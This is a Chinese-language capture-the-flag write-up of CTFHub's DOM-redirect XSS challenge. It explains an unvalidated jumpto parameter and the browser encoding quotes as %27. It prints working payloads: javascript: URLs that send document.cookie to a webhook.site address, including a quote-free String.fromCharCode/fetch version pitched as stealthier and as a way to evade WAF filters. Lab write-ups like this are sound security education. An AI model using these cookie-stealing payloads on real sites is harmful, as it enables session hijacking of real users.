【CTFHub】Web-DOM跳转XSS Writeup

操作者：何芊宏 | 操作日期：2026.9.23 | 分类：CTF | 标签：CTFHub, Web, XSS, DOM型, Webhook, OOB

1. 题目信息

  • 平台：CTFHub
  • 分类：Web - XSS / DOM跳转
  • 题目名称：DOM跳转
  • 注入点：URL 参数 ?jumpto=（前端输入框为灰色，无法直接输入）。
  • 目标：利用 JavaScript 跳转协议，窃取机器人（Bot）的 Cookie。

2. 解题思路与知识点

DOM跳转漏洞原理：前端 JavaScript 读取 URL 中的参数（本关为 jumpto），并将其直接赋值给 location.href 或类似跳转函数。由于未对协议进行白名单校验，攻击者可传入 javascript: 伪协议，使浏览器不执行页面跳转，而是将后续字符串作为 JS 代码执行。

核心难点（浏览器地址栏转码机制）：现代浏览器在地址栏输入包含单引号（'）的代码时，为了安全性会自动将其编码为 %27。

  • 当机器人访问带有 %27 的 URL 时，前端 JS 实际接收到的是 location.href=%27https://...。
  • 由于 %27 并非 JS 标准协议字符，机器人的浏览器在执行时会直接抛出语法错误（SyntaxError），导致后续的网络请求中断。
  • 解决方案：使用完全无引号的 Payload（如 String.fromCharCode()），避免触发地址栏的自动转码机制。

3. 操作步骤

第一步：探测与验证

由于页面输入框为灰色，直接在浏览器地址栏拼接参数进行测试：

http://challenge-xxxx.sandbox.ctfhub.com:10800/?jumpto=javascript:alert(1)

页面弹出弹窗，确认参数名正确且未过滤 javascript: 协议。

第二步：常规引号 Payload 尝试（触发转码陷阱）

尝试使用带单引号的完整外带 Payload：

http://challenge-xxxx.../?jumpto=javascript:location.href='https://webhook.site/.../?cookie='+document.cookie

页面出现白屏，但 Webhook 无法收到请求。通过 F12 控制台查看，发现地址栏将 ' 转码成了 %27，导致机器人执行失败。

第三步：编码绕过与尝试（失败记录）

尝试使用 Base64 编码配合 eval(atob(...)) 以及 location.hash.substring(1) 绕过引号，均未成功外带数据。

第四步：最终成功 Payload（无引号外带）

使用 String.fromCharCode() 避开一切引号，并使用 fetch() 替代页面跳转：

http://challenge-xxxx.../?jumpto=javascript:fetch(String.fromCharCode(104,116,116,112,115,58,47,47,119,101,98,104,111,111,107,46,115,105,116,101,47,52,52,102,52,102,56,53,55,45,49,102,54,102,45,52,101,51,52,45,98,100,101,56,45,50,98,57,50,98,50,53,98,55,54,56,57,47,63,99,111,111,107,105,101,61)+document.cookie)

复制此完整 URL 粘贴至 Send URL to Bot 提交。页面提示 Successfully。返回 Webhook 页面，成功获取 Flag：

ctfhub{9ec30890bb6c28dd899d41e6}

提交至 CTFHub，通关成功。

4. 踩坑记录与复盘

  • 坑1：地址栏自动转码单引号。浏览器地址栏会将单引号转码为 %27，机器人执行时无法识别，导致 JS 报错中断。遇到此类纯 JS 注入题目，应杜绝使用单引号。
  • 坑2：盲目使用 new Image() 导致白屏。尽管 new Image() 执行会覆盖页面导致白屏，但在拼接后半部分代码时，一旦因转码问题导致语法错误，请求仍会失败。转而使用 fetch() 更加稳定，静默请求且不会导致页面重绘。
  • 坑3：地址栏长度截断。在发送给机器人时，地址栏过长可能会导致 Send URL to Bot 输入框显示不全，在粘贴时需要确认尾部关键代码（如 +document.cookie）未被截断。

5. 知识总结

  • 无引号 Payload 构造：使用 String.fromCharCode() 可以将 ASCII 码转换为字符串，从而绕过所有针对引号、特定关键词（如 http）的 WAF 过滤与转码。
  • fetch 与 location 的选择：在 XSS 外带场景中，推荐使用 fetch()。它能够静默发起网络请求，不会像 location.href 那样造成页面跳转，也不会像 new Image() 那样导致页面白屏，降低被管理员察觉的风险。
  • 浏览器转码机制：前端漏洞利用时，要考虑到浏览器会自动对 URL 中的特殊字符进行编码，编写 Payload 时必须提前将这一层转码因素考虑在内。
